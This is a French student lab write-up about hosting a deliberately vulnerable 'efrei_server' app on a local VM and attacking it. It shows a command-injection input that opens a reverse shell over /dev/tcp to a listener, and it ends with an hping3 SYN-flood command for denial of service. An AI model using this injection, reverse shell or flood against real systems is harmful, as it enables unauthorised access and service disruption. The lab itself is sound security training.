# I. Partie 1 : Host & Hack
## Sommaire

- [I. Partie 1 : Host \& Hack](#i-partie-1--host--hack)
  - [Sommaire](#sommaire)
  - [1. A vos marques](#1-a-vos-marques)
  - [2. Prêts](#2-prêts)
  - [3. Hackez](#3-hackez)

## 1. A vos marques

🌞 **Télécharger l'application depuis votre VM**

> je l'ai d'abord téléchargé sur mon ordi et fait un :
```bash
scp C:\Users\cleme\Downloads\efrei_server dums@192.168.56.101:/home/dums
```

🌞 **Lancer l'application `efrei_server`**

```bash
export LISTEN_ADDRESS=192.168.56.101
./efrei_server
```

🌞 **Prouvez que l'application écoute sur l'IP que vous avez spécifiée**
```bash
tcp        LISTEN      0           100                                          192.168.56.101:8888                       0.0.0.0:*         users:(("main.bin",pid=1726,fd=6))
```

## 2. Prêts

🌞 **Se connecter à l'application depuis votre PC**

```bash
ncat 192.168.56.101 8888
```

## 3. Hackez

🌞 **Euh bah... hackez l'application !**

**Sur la VM :**
```bash
./efrei_server
Warning: You should consider setting the environment variable LOG_DIR. Defaults to /tmp.
Server started. Listening on ('192.168.56.101', 8888)...
LS command called by ('192.168.56.1', 63578)
```
**Sur le terminal qui demande le reverse shell :**
```bash
PS C:\Windows\System32> ncat 192.168.56.101 8888
Hello ! Tu veux des infos sur quoi ?
1) cpu
2) ram
3) disk
4) ls un dossier

Ton choix (1, 2, 3 ou 4) : 4
Ex├®cuter la commande ls vers le dossier : /home/dums ; sh -i >& /dev/tcp/192.168.56.1/33127 0>&1
```

**Sur le terminal d'écoute :**
```bash
PS C:\Windows\System32> ncat -l 33127
sh-5.1$
```

🌟 **BONUS : DOS l'application**

```bash
hping3 --flood -S 192.168.56.101 -p 8888
```

> ➜ [**Lien vers la partie 2**](/part2/readme.md)